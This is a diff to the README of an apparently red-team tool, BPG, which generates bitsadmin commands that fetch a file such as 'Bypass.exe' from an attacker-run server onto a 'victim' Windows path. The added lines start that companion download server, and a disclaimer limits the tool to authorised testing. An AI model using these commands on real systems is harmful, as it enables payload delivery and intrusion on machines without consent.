@@ -12,6 +12,11 @@ Is your server running on a different port you can use this command:
 ```
 python3 bitsadmin.py -i 192.168.1.99 -p 1234 -j myJob -f file.txt -l 'C:\users\victim' -o enc.txt -exe Bypass.exe
 ```
+Start the bitsadmin-server with the following command so bitsadmin can download the fille.
+```bash
+python3 bitsadmin-server.py
+```
+
 
 ### Disclaimer
 BPG is a tool designed for legitimate purposes, such as penetration testing, red teaming, and security research. It should not be used for any illegal or unauthorized activities. Using BPG to download or distribute malicious files, or to compromise systems without permission, is strictly prohibited.
